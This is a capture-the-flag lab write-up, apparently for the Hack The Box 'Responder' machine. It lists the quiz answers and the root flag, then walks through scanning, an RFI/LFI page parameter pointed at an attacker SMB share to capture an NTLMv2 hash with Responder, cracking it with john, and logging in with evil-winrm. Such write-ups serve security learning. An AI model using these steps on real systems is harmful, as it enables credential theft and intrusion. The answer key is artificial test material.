# Tasks
- When visiting the web service using the IP address, what is the domain that we are being redirected to?
	- unika.htb
- Which scripting language is being used on the server to generate webpages?
	- php
- What is the name of the URL parameter which is used to load different language versions of the webpage?
	- page
- Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
	- ../../../../../../../../windows/system32/drivers/etc/hosts
- Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
	- //10.10.14.6/somefile
- What does NTLM stand for?
	- New Technology LAN Manager
- Which flag do we use in the Responder utility to specify the network interface?
	- -I
- There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
	- john the ripper
- What is the password for the administrator user?
	- badminton
- We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
	- 5985
- Submit root flag
	- ea81b7afddd03efaa0945333ed147fac


# Steps
- First, we can do a rustscan to see what is going on.
```
rustscan --ulimit 5000 --addresses "10.129.95.234" --top -- -sC -sV
```
- From the scan, we are only given that there is a web server running with WinRM as well
```
PORT     STATE SERVICE    REASON          VERSION  
80/tcp   open  http       syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1  
7680/tcp open  pando-pub? syn-ack ttl 127
```
- This is using the domain of unika.htb, so we can add that with the machine IP in your /etc/hosts to be able to access it.
- Visiting the page, we are greeted to a website.
- Not too fancy, but what is notable is the ability to switch the languages, which does by using a URL parameter called page.
```
?page=en
```
- So, let's take advantage of Responder to see if we can use that in some way
- We can do that by running this.
```
responder -I tun0
```
- We can then use the page parameter to attempt to trigger Responder
```
http://unika.htb/?page=//10.10.14.21/somefile
```
- From there, we are able to grab the Administrator's NTLM
```
[SMB] NTLMv2-SSP Client   : 10.129.95.234  
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator  
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1122334455667788:3B4C51B0921E7C74A8C3B7022D5444D5:0101000000000000808C342B775CDC01D0483287BDB1E5180000000002000800370037005700380001001E00570049004E002D005200450051004F003700370033005  
10034005200590004003400570049004E002D005200450051004F0037003700330051003400520059002E0037003700570038002E004C004F00430041004C000300140037003700570038002E004C004F00430041004C000500140037003700570038002E004C004F00430041004C0007000800808C3  
42B775CDC0106000400020000000800300030000000000000000100000000200000404CD89FD24745562593377EFB9AB3F8AF412009C09C17C74769ADFCED250A2A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E003  
20031000000000000000000
```
- We can now save it into a file and attempt to crack it using john the ripper.
```
john --wordlist=`fzf-wordlists` hash.txt
```
- We can then easily crack the password!
```
[Nov 23, 2025 - 12:50:49 (PST)] exegol-htb-starting-point /workspace # john --wordlist=`fzf-wordlists` hash.txt              
Using default input encoding: UTF-8  
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])  
Will run 32 OpenMP threads  
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status  
badminton        (Administrator)        
1g 0:00:00:00 DONE (2025-11-23 12:51) 16.67g/s 273066p/s 273066c/s 273066C/s 123456..christal  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably  
Session completed.
```
- Now that we have the Adminstrator's password, we can use evil-winrm to connect to the machine via PowerShell
```
evil-winrm -i 10.129.1.77 -u administrator -p badminton
```
- We can then navigate around and get the flag
```
*Evil-WinRM* PS C:\Users\mike\Desktop> ls  
  
  
   Directory: C:\Users\mike\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-a----         3/10/2022   4:50 AM             32 flag.txt  
  
  
*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt  
ea81b7afddd03efaa0945333ed147fac
```
